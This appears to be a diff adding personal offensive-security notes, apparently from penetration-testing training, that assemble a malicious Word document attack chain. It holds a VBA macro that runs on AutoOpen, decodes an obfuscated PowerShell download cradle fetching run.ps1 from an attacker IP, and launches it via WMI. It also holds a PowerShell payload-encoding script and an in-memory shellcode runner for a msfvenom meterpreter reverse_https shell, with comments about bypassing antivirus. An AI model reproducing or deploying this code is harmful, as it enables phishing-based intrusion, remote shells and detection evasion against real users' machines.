@@ -1,0 +1,144 @@
+All this will run a separate Powershell process detached from word
+Powershell run.ps1 will run fully in 64 bit powershell process memory and VBA will also avoid detection heuristic and otherwise
+
+Win API call from VBA to avoid shell()
+
+Sub Mymacro()
+Dim strArg As String
+strArg = StrReverse("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
+
+GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
+End Sub
+
+Above code is not Required
+
+Powershell Encryption script:
+$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.ps1'))"
+
+[string]$output = ""
+
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+$output | clip
+
+In above change payload variable to below 2 strings as well and get numeric characters:
+winmgmts:
+Win32_Process
+runner.doc
+
+Final code but use above Encryption routines and place values at appropriate locations because IP will be going to get changed: 
+Apples = Encrypted(-----powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.225/run.ps1'))-----)
+GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+-> GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132"))
+
+VB Code starts here=================================================================================================================================================================================================================================================================
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+
+Function MyMacro()
+    Dim Apples As String
+    Dim Water As String
+
+//runner.doc string here 
+If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
+  Exit Function
+End If
+    
+
+    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069070063067067070064131134127063129132066056058058" //Need to replace only this string
+    Water = Nuts(Apples)
+    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+End Function
+
+
+Sub AutoOpen()
+	MyMacro
+End Sub
+
+
+
+For ps1 host below code on server as run.ps1, this will bypass antivirus and won't write to disk + above VB code itself won't get detected
+
+
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...(this is shellcode generated using msfvenom for ps - powershell here will run as 64 bit process - 
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f ps1
+)
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+
